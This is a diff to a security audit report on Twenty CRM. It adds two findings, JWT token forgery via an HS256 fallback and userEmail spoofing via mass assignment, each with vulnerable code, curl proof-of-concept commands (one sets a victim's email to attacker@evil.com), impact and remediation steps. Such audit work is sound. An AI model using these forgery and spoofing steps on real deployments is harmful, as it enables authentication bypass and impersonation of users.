@@ -9,12 +9,12 @@
 
 ## Executive Summary
 
-This security audit of Twenty CRM identified **10 confirmed vulnerabilities** with live proof-of-concept exploitation, plus **2 additional vulnerability patterns** that are exploitable under specific configurations. The findings include critical remote code execution paths, authentication bypass issues, token storage flaws, OAuth security issues, and weak password enforcement.
+This security audit of Twenty CRM identified **12 confirmed vulnerabilities** with live proof-of-concept exploitation, plus **2 additional vulnerability patterns** that are exploitable under specific configurations. The findings include critical remote code execution paths, JWT token forgery enabling complete authentication bypass, mass assignment flaws, token storage issues, OAuth security vulnerabilities, and weak password enforcement.
 
 | Severity | Count | Status |
 |----------|-------|--------|
-| CRITICAL | 4 | Confirmed with live exploitation |
-| HIGH | 5 | Confirmed with live exploitation |
+| CRITICAL | 5 | Confirmed with live exploitation |
+| HIGH | 6 | Confirmed with live exploitation |
 | MEDIUM | 3 | Confirmed / Pattern confirmed in code |
 
 **Key Findings:**
@@ -22,6 +22,8 @@ This security audit of Twenty CRM identified **10 confirmed vulnerabilities** wi
 - Unauthenticated route triggers can execute arbitrary code
 - Server environment variables (including database credentials) leaked to logic functions
 - Code interpreter exposes full server environment to Python execution
+- JWT token forgery via HS256 fallback enables complete authentication bypass
+- Mass assignment allows spoofing any workspace member's email
 - Unauthenticated OAuth client registration enables credential phishing
 - Host header injection in OAuth discovery enables OAuth mix-up attacks
 - No rate limiting on login endpoints enables credential brute-forcing
@@ -506,6 +508,123 @@ When a refresh token is used and marked as revoked, it can still be reused withi
 
 ---
 
+### VULN-013: JWT Token Forgery via HS256 Fallback (CRITICAL)
+
+**Severity:** CRITICAL
+**CVSS 3.1 Score:** 9.8 (Critical)
+**File:** `packages/twenty-server/src/engine/core-modules/jwt/services/jwt-wrapper.service.ts:88-198`
+
+**Description:**
+The JWT verification system supports two algorithms: ES256 (asymmetric, uses `kid` header) and HS256 (symmetric, legacy fallback). When a JWT lacks a `kid` header field, `resolveVerificationKey()` falls through to the HS256 path where the signing key is derived as `sha256(APP_SECRET + workspaceId + tokenType)`.
+
+Combined with VULN-003/VULN-008 (APP_SECRET exposure), an attacker can forge ANY token type for ANY user in ANY workspace.
+
+**Vulnerable Code:**
+```typescript
+// jwt-wrapper.service.ts lines 88-93
+if (isAsymmetricJwtHeader(jwtHeader)) {
+  // Uses ES256 with kid lookup
+} else {
+  // Falls through to HS256 legacy path
+  return this.generateAppSecret(extractedWorkspaceId, type);
+}
+
+// Line 196-198
+generateAppSecret(workspaceId, type): string {
+  return crypto.createHash('sha256')
+    .update(this.environmentService.get('APP_SECRET') + workspaceId + type)
+    .digest('hex');
+}
+```
+
+**Proof of Concept:**
+```bash
+# Step 1: Leak APP_SECRET via VULN-008
+APP_SECRET="bXktYXVkaXQtYXBwLXNlY3JldC1mb3ItdHdlbnR5LWF1ZGl0"
+
+# Step 2: Derive signing key
+SIGNING_KEY=$(echo -n "${APP_SECRET}${WORKSPACE_ID}ACCESS" | sha256sum | cut -d' ' -f1)
+
+# Step 3: Forge token (no kid header = HS256 fallback)
+# Header: {"alg":"HS256","typ":"JWT"}
+# Payload: {sub, type:"ACCESS", userId, workspaceId, ...}
+
+# Step 4: Use forged token
+curl -H "Authorization: Bearer $FORGED_TOKEN" http://TARGET:3000/metadata \
+  -d '{"query":"query { currentUser { id email } }"}'
+
+# Response: {"data":{"currentUser":{"id":"...","email":"auditor@audit.test"}}}
+```
+
+**Impact:**
+- Complete authentication bypass for ANY user
+- Impersonate administrators, access all workspace data
+- Forge REFRESH, FILE, and API_KEY tokens by changing the type parameter
+- Tokens remain valid until expiry (no revocation mechanism for HS256 tokens)
+- Persist access across server restarts (key derivation is deterministic)
+
+**Remediation:**
+1. Remove HS256 fallback entirely - use ES256 exclusively
+2. If migration period needed, require explicit flag to allow HS256 tokens
+3. Add token binding (IP, device fingerprint)
+4. Log legacy token usage for detection
+
+---
+
+### VULN-014: userEmail Spoofing via Mass Assignment (HIGH)
+
+**Severity:** HIGH
+**CVSS 3.1 Score:** 6.5 (Medium)
+**File:** `packages/twenty-server/src/engine/core-modules/user/user.resolver.ts:515-518`
+
+**Description:**
+The `updateWorkspaceMemberSettings` mutation accepts `update: Record<string, unknown>` (GraphQLJSON) and spreads it directly into TypeORM's `save()` method. The allowlist check in `assertWorkspaceMemberUpdateUsesNonCustomFieldsOnly()` only blocks `id` and `userId` fields, but allows `userEmail` to be modified.
+
+Any authenticated user with WORKSPACE_MEMBERS permission can overwrite any workspace member's displayed email address.
+
+**Vulnerable Code:**
+```typescript
+// user.resolver.ts lines 515-518
+const workspaceMemberUpdatePayload: Partial<WorkspaceMemberWorkspaceEntity> =
+  {
+    id: workspaceMember.id,
+    ...(input.update as Partial<WorkspaceMemberWorkspaceEntity>), // Mass assignment
+  };
+
+// assert-workspace-member-update-non-custom-fields.util.ts
+const WORKSPACE_MEMBER_UPDATE_DISALLOWED_FIELD_NAMES = new Set([
+  'id',
+  'userId',  // userEmail NOT blocked!
+]);
+```
+
+**Proof of Concept:**
+```bash
+# With forged token (VULN-013) or legitimate auth
+curl -s -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"query":"mutation { updateWorkspaceMemberSettings(input: { workspaceMemberId: \"$VICTIM_ID\", update: { userEmail: \"attacker@evil.com\" } }) }"}' \
+  "http://TARGET:3000/metadata"
+
+# Response: {"data":{"updateWorkspaceMemberSettings":true}}
+# Victim's displayed email is now attacker@evil.com
+```
+
+**Impact:**
+- Spoof any workspace member's displayed email address
+- Impersonate colleagues in the CRM UI (visible in member lists, activity feeds)
+- Social engineering attacks against team members
+- Damage trust and data integrity within the workspace
+- Combined with VULN-013, attackers can spoof anyone without credentials
+
+**Remediation:**
+1. Add `userEmail` to `WORKSPACE_MEMBER_UPDATE_DISALLOWED_FIELD_NAMES`
+2. Use explicit allowlist of modifiable fields instead of blocklist
+3. Separate endpoints for profile self-update vs admin member management
+4. Log all userEmail changes with audit trail
+
+---
+
 ## Remediation Priority Matrix
 
 | Priority | Vulnerability | Effort | Impact |
@@ -514,11 +633,13 @@ When a refresh token is used and marked as revoked, it can still be reused withi
 | P0 | VULN-002: Route Trigger RCE | Medium | Critical |
 | P0 | VULN-003: Env Leakage (Logic Functions) | Low | Critical |
 | P0 | VULN-008: Env Leakage (Code Interpreter) | Low | Critical |
+| P0 | VULN-013: JWT Token Forgery (HS256) | Medium | Critical |
 | P1 | VULN-009: OAuth Registration | Low | High |
 | P1 | VULN-004: Brute Force | Low | High |
 | P1 | VULN-005: User Enumeration | Low | High |
 | P1 | VULN-010: Invitation Token Plaintext | Low | High |
 | P1 | VULN-012: Host Header Injection | Low | High |
+| P1 | VULN-014: userEmail Spoofing | Low | High |
 | P2 | VULN-006: First User Admin | Medium | High |
 | P2 | VULN-007: Token Reuse | Low | Medium |
 | P2 | VULN-011: Weak Password Policy | Low | Medium |
@@ -571,10 +692,13 @@ autofyn_audit/
     ├── 07_route_trigger_rce.sh
     ├── 08_env_leakage.sh
     ├── 09_refresh_token_reuse.sh
-    ├── 10_code_interpreter_env.sh   # NEW: Code interpreter env leakage
-    ├── 11_oauth_registration.sh     # NEW: Unauthenticated OAuth registration
-    ├── 12_invitation_token_plaintext.sh   # NEW: Invitation token plaintext storage
-    └── 13_weak_password_policy.sh         # NEW: Weak password policy
+    ├── 10_code_interpreter_env.sh         # Code interpreter env leakage
+    ├── 11_oauth_registration.sh           # Unauthenticated OAuth registration
+    ├── 12_invitation_token_plaintext.sh   # Invitation token plaintext storage
+    ├── 13_weak_password_policy.sh         # Weak password policy
+    ├── 14_host_header_injection.sh        # OAuth discovery host header injection
+    ├── 15_jwt_token_forgery.sh            # JWT HS256 fallback token forgery
+    └── 16_useremail_spoofing.sh           # Mass assignment userEmail spoofing
 ```
 
 ---
